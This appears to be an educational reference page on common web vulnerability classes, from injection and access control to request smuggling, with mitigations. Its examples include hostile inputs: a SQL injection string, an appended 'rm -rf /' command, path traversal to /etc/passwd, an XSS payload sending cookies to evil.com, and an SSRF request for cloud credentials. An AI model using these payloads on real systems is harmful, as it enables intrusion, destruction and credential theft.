---
title: Web Application Vulnerabilities
nav_order: 3
---

# Common Web Application Vulnerability Classes

> Synthesized from **OWASP** (Open Web Application Security Project) Top 10 and API Security Top 10, **PortSwigger Web Security Academy** (James Kettle, Gareth Heyes, and the PortSwigger research team), **Google Project Zero**, **Troy Hunt** (HaveIBeenPwned, security educator), and **The Web Application Hacker's Handbook** (Stuttard & Pinto).

---

## Framing: How Vulnerabilities Are Classified

The two most widely used classification systems:

- **OWASP Top 10**: A ranked list of the most critical web application security risks, updated periodically based on data from hundreds of organizations. The 2021 edition shifted from symptom-based to root-cause groupings.
- **CWE (Common Weakness Enumeration)**: A MITRE-maintained taxonomy of software weaknesses. Every finding in a security review should reference a CWE ID for precision and traceability.
- **CVE (Common Vulnerabilities and Exposures)**: Specific, disclosed instances of vulnerabilities in named products. CVEs reference CWEs.

---

## The Vulnerability Classes

---

### 1. Injection (CWE-89, CWE-78, CWE-917)

**What it is:** An attacker sends data that an interpreter executes as code rather than treating it as data.

**SQL Injection (SQLi)** — the canonical example:
```sql
-- Vulnerable: user input concatenated directly
SELECT * FROM users WHERE username = '' OR '1'='1' --' AND password = '...'

-- Safe: parameterized query
SELECT * FROM users WHERE username = ? AND password = ?
```

**Variants:**
- **Error-based SQLi**: Extracts data via database error messages
- **Blind SQLi (boolean/time-based)**: Infers data by observing true/false differences in responses or response timing
- **Second-order SQLi**: Payload stored in the DB, executed later — bypasses input filters on writes
- **OS Command Injection (CWE-78)**: `exec("ping " + userInput)` — attacker appends `; rm -rf /`
- **LDAP Injection**: Unsanitized input in LDAP queries
- **Template Injection (SSTI)**: User input evaluated by a server-side template engine (Jinja2, Twig, FreeMarker)
- **Log Injection / Log4Shell (CVE-2021-44228)**: Input passed to a logger triggers JNDI lookups — high-profile 2021 incident

**Mitigation:**
- Parameterized queries / prepared statements for all DB interactions
- ORMs with bound parameters (not raw query interpolation)
- Input validation with allowlists where possible
- Principle of least privilege on DB accounts

---

### 2. Broken Authentication (CWE-287, CWE-306)

**What it is:** Weaknesses in authentication mechanisms that allow attackers to assume other users' identities.

**Common failure modes (from Troy Hunt's writing on credential databases):**
- **Credential stuffing**: Automated use of leaked username/password pairs from other breaches (85%+ of login traffic at major sites)
- **Brute force**: No rate limiting on login endpoints
- **Password reset flaws**: Predictable tokens, tokens that don't expire, tokens valid for multiple uses
- **Session fixation**: Attacker sets a session ID before authentication; victim authenticates under attacker's session
- **Insecure "remember me" tokens**: Long-lived tokens derived from predictable values

**Mitigation:**
- Argon2id (or bcrypt, scrypt) for password hashing with appropriate cost parameters
- Multi-factor authentication, especially for privileged accounts
- Rate limiting and account lockout on login/reset endpoints
- Cryptographically random session tokens (128+ bits of entropy)
- New session ID issued on privilege level change (login, logout, role change)
- Check passwords against known breach databases (HaveIBeenPwned API)

---

### 3. Broken Access Control / Authorization (CWE-284, CWE-639, CWE-22)

OWASP ranked this #1 in 2021. The PortSwigger research team documents this as consistently the most prevalent finding in real-world apps.

**Sub-classes:**

**Broken Object Level Authorization (BOLA / IDOR — Insecure Direct Object Reference):**
```
GET /api/invoices/1042  → returns the invoice
GET /api/invoices/1043  → returns someone else's invoice (no ownership check)
```
The fix: every request that accesses an object must verify the requesting user has permission to access *that specific object*, not just the object type.

**Broken Function Level Authorization:**
```
DELETE /api/admin/users/42  → no check that caller is actually admin
```

**Path Traversal (CWE-22):**
```
GET /files?name=../../etc/passwd
```

**Privilege Escalation**: Horizontal (access peer's data) vs. Vertical (access higher-privilege functionality).

**Mitigation:**
- Server-side authorization on every request, never client-side
- Default deny: everything is forbidden unless explicitly permitted
- Centralize authorization logic — never duplicate access checks across handlers
- Use indirect references (map user-visible IDs to internal IDs server-side)
- Automated tests that explicitly test authorization boundaries

---

### 4. Cryptographic Failures (CWE-311, CWE-326, CWE-327, CWE-330)

Formerly "Sensitive Data Exposure." The root cause is almost always misuse of cryptography or failure to apply it.

**Common failures:**
- Transmitting sensitive data over HTTP (not HTTPS)
- Storing passwords with MD5 or SHA1 (unsalted or salted)
- Using ECB mode for AES (leaks patterns in plaintext)
- Using CBC without authentication (vulnerable to padding oracle attacks — BEAST, POODLE)
- Deriving keys from low-entropy sources (predictable seeds)
- Reusing IVs/nonces with stream ciphers or GCM (catastrophic)
- Hardcoded encryption keys in source code

**Schneier's Law** (Bruce Schneier): "Anyone can invent a security system so clever that they themselves can't see its flaws." Use standard, audited, widely-deployed algorithms. Do not roll your own crypto.

**Mitigation:**
- TLS 1.2+ for all data in transit; HSTS headers enforced
- Argon2id/bcrypt/scrypt for passwords; never reversible encryption
- AES-256-GCM or ChaCha20-Poly1305 for data at rest
- Key management via HSM or dedicated secrets management (HashiCorp Vault, AWS KMS)
- Certificate pinning for high-value mobile applications

---

### 5. Security Misconfiguration (CWE-16)

James Kettle (PortSwigger) notes that a large share of critical vulnerabilities are configuration issues, not code bugs.

**Examples:**
- Default credentials left unchanged (admin/admin)
- Directory listing enabled on web servers
- Detailed error messages and stack traces returned in production
- Unnecessary services, ports, accounts, or features enabled
- CORS configured with `Access-Control-Allow-Origin: *` on authenticated APIs
- Security headers absent: CSP, X-Frame-Options, X-Content-Type-Options, Referrer-Policy
- Cloud storage buckets (S3, GCS) publicly accessible
- Verbose server headers revealing software versions

**Mitigation:**
- Infrastructure-as-code for all configuration (no manual console changes in prod)
- CIS Benchmarks as baseline configuration standards
- Automated configuration scanning (ScoutSuite, Prowler for cloud; Lynis for OS)
- Defense-in-depth: assume each layer will be misconfigured; don't rely on any single layer

---

### 6. Vulnerable and Outdated Components (CWE-1035)

A systemic problem Troy Hunt has highlighted: organizations running software years behind current versions.

**Notable incidents:**
- **Equifax breach (2017)**: Apache Struts CVE-2017-5638, unpatched for 2 months
- **Log4Shell (2021)**: CVE-2021-44228 in Log4j, present in thousands of applications
- **Spring4Shell (2022)**: CVE-2022-22965 in Spring Framework

**Mitigation:**
- Software composition analysis (SCA) tools: Snyk, OWASP Dependency-Check, GitHub Dependabot
- Maintain a Software Bill of Materials (SBOM)
- Automate dependency updates (Renovate or Dependabot PRs)
- Subscribe to security advisories for critical dependencies
- Pin versions; don't use floating ranges in production

---

### 7. Cross-Site Scripting (XSS) (CWE-79)

**What it is:** Attacker-controlled JavaScript executes in another user's browser in the context of the vulnerable application.

**Variants:**

**Reflected XSS**: Payload in the request is immediately reflected in the response.
```
https://example.com/search?q=<script>document.location='https://evil.com/?c='+document.cookie</script>
```

**Stored XSS**: Payload persisted in the database, served to all visitors of the affected page. Higher severity — no social engineering needed.

**DOM-based XSS**: Payload processed entirely in the browser via JavaScript DOM manipulation. Server never sees the payload.
```javascript
// Vulnerable
document.getElementById('output').innerHTML = location.hash.slice(1);
```

**Mitigation:**
- Framework auto-escaping: React, Angular, Vue all escape by default — avoid `dangerouslySetInnerHTML`, `[innerHTML]`, `v-html` with user input
- Content Security Policy (CSP): `script-src 'self'` prevents inline script execution
- HttpOnly cookies: mitigates session theft via XSS (document.cookie inaccessible)
- Context-aware output encoding: HTML encode for HTML context, JS encode for JavaScript context, URL encode for URL context

---

### 8. Cross-Site Request Forgery (CSRF) (CWE-352)

**What it is:** A malicious site tricks an authenticated user's browser into making unintended requests to a target site.

```html
<!-- Attacker's page -->
<img src="https://bank.com/transfer?to=attacker&amount=5000">
```

**Mitigation:**
- **SameSite cookie attribute**: `SameSite=Strict` or `SameSite=Lax` — prevents cookies from being sent on cross-site requests (primary defense in modern browsers)
- **CSRF tokens**: Per-session or per-request unpredictable tokens validated server-side
- **Origin/Referer header validation**: Secondary defense
- Note: CSRF is largely mitigated by default in SPAs using token-based auth (tokens in Authorization headers, not cookies)

---

### 9. Server-Side Request Forgery (SSRF) (CWE-918)

James Kettle of PortSwigger produced the seminal research on SSRF. Ranked in the OWASP Top 10 for the first time in 2021 given its prevalence in cloud environments.

**What it is:** Attacker causes the server to make HTTP requests to attacker-controlled destinations, potentially reaching internal services.

```
POST /api/fetch-url
{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}
```
This hits the AWS EC2 metadata endpoint and can exfiltrate IAM credentials.

**Blind SSRF**: No response reflected, but side-channel observation (DNS lookups, timing differences) confirms the request was made.

**Mitigation:**
- Allowlist permitted URL schemes and hostnames; never blocklist
- Disable redirects or validate the final destination after following redirects
- Block access to cloud metadata endpoints from application processes
- Network segmentation: application servers should not be able to reach internal management interfaces

---

### 10. Insecure Deserialization (CWE-502)

**What it is:** Applications deserializing untrusted data can trigger arbitrary code execution, depending on the language runtime and available gadget chains.

High-profile exploits in Java (Apache Commons Collections gadget chain), Python (pickle), PHP (unserialize), and Ruby (Marshal).

```python
# Never do this with untrusted data
import pickle
data = pickle.loads(user_supplied_bytes)  # arbitrary code execution if malicious
```

**Mitigation:**
- Prefer data formats (JSON, protobuf) over language-native serialization
- If native serialization is required, use integrity checks (HMAC) to verify data has not been tampered with before deserializing
- Run deserialization in sandboxed processes with minimal permissions
- Use serialization allowlists that restrict which classes can be instantiated

---

### 11. HTTP Request Smuggling (CWE-444)

PortSwigger's James Kettle brought widespread attention to this class. Mismatches between how front-end (load balancer/CDN) and back-end servers parse HTTP/1.1 `Content-Length` and `Transfer-Encoding` headers allow attackers to "smuggle" a second request inside the first.

**Consequences:** Bypassing security controls, poisoning the request cache, capturing other users' requests, achieving web cache poisoning.

**Mitigation:**
- Use HTTP/2 end-to-end (HTTP/2 eliminates the ambiguity)
- Ensure consistent HTTP parsing between all servers in the request pipeline
- Reject ambiguous requests at the front-end

---

### 12. Web Cache Poisoning

James Kettle coined this attack class. Attacker injects a malicious response into a shared cache so that subsequent legitimate users receive it.

**Requires:** A cache key that does not include an input the application uses (an "unkeyed input"), and the ability to cause a cacheable response that incorporates that input.

**Mitigation:**
- Include all response-influencing inputs in cache keys
- Use `Vary` headers accurately
- Disable caching for responses that incorporate user-controlled data

---

## Vulnerability Severity Mental Model

When assessing a finding, consider:
- **Exploitability**: How easy is it? No authentication required? Remotely exploitable?
- **Scope**: Does it cross privilege boundaries? Can it compromise other users?
- **Impact**: Confidentiality, integrity, availability — which and to what degree?
- **Prevalence**: How widespread is the vulnerable code path?

Use CVSS 3.1 scores as a starting point, but always apply judgment — context matters more than a formula.

---

## Key References

- OWASP Top 10 (2021): https://owasp.org/Top10/
- OWASP API Security Top 10 (2023): https://owasp.org/API-Security/
- PortSwigger Web Security Academy: https://portswigger.net/web-security
- Stuttard, D. & Pinto, M. (2011). *The Web Application Hacker's Handbook* (2nd ed.). Wiley.
- Kettle, J. — Research blog at PortSwigger (web cache poisoning, HTTP request smuggling, SSRF)
- CWE/SANS Top 25 Most Dangerous Software Weaknesses: https://cwe.mitre.org/top25/
